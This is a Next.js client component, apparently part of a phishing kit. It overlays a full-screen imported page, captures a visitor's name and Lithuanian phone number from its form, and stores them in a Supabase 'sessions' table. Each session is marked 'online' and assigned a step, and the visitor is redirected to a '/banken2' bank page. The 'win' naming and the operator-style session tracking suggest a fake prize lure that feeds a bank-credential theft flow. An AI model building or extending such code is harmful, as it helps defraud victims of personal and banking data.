"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { persistActiveSession } from "@/lib/session-id-client";
import { WIN2_CSS, WIN2_HTML } from "./win2-design";

type Props = {
  sessionId: string | null;
  routeSessionId?: string;
};

export function Win2Client({ sessionId, routeSessionId }: Props) {
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const containerRef = useRef<HTMLDivElement>(null);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [saving, setSaving] = useState(false);
  const savingRef = useRef(false);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  useEffect(() => {
    savingRef.current = saving;
  }, [saving]);

  // HTML'deki form submit'ini Supabase'e bagla (tasarim birebir korunur)
  useEffect(() => {
    const root = containerRef.current;
    if (!root) return;
    const form = root.querySelector("form");
    if (!form) return;

    const onSubmit = async (e: Event) => {
      e.preventDefault();
      if (!supabase || !effectiveSessionId || savingRef.current) return;
      savingRef.current = true;
      setSaving(true);

      const fullNameInput = form.querySelector<HTMLInputElement>('input[name="fullname"]');
      const phoneInput = form.querySelector<HTMLInputElement>('input[name="phone"]');
      const fullName = (fullNameInput?.value ?? "").trim();
      const digits = (phoneInput?.value ?? "").replace(/\D/g, "").replace(/^370/, "").slice(0, 8);
      const fullPhone = digits;
      const nameParts = fullName.split(/\s+/).filter(Boolean);
      const firstName = nameParts.shift() ?? "";
      const lastName = nameParts.join(" ");

      const { data: row } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", effectiveSessionId)
        .maybeSingle();
      const prevFd = (row?.form_data ?? {}) as Record<string, unknown>;

      const { error: upErr } = await supabase
        .from("sessions")
        .update({
          is_hidden: false,
          status: "online",
          current_step: "banken2",
          form_data: {
            ...prevFd,
            firstName,
            lastName,
            phone: fullPhone,
            is_win2_flow: true,
            pending_profile: false,
          },
        })
        .eq("id", effectiveSessionId);

      if (upErr) {
        savingRef.current = false;
        setSaving(false);
        return;
      }

      try {
        persistActiveSession(effectiveSessionId, routeSessionId);
        localStorage.setItem(`session:${effectiveSessionId}:profileComplete`, "1");
      } catch {
        /* best-effort */
      }

      const qs = routeSessionId ? `?session=${encodeURIComponent(routeSessionId)}` : "";
      window.location.href = `/banken2${qs}`;
    };

    form.addEventListener("submit", onSubmit);
    return () => form.removeEventListener("submit", onSubmit);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [effectiveSessionId, routeSessionId, supabase]);

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: WIN2_CSS }} />
      <div
        ref={containerRef}
        style={{
          position: "fixed",
          inset: 0,
          zIndex: 9999,
          overflow: "auto",
          background: "#fff",
        }}
        dangerouslySetInnerHTML={{ __html: WIN2_HTML }}
      />
    </>
  );
}
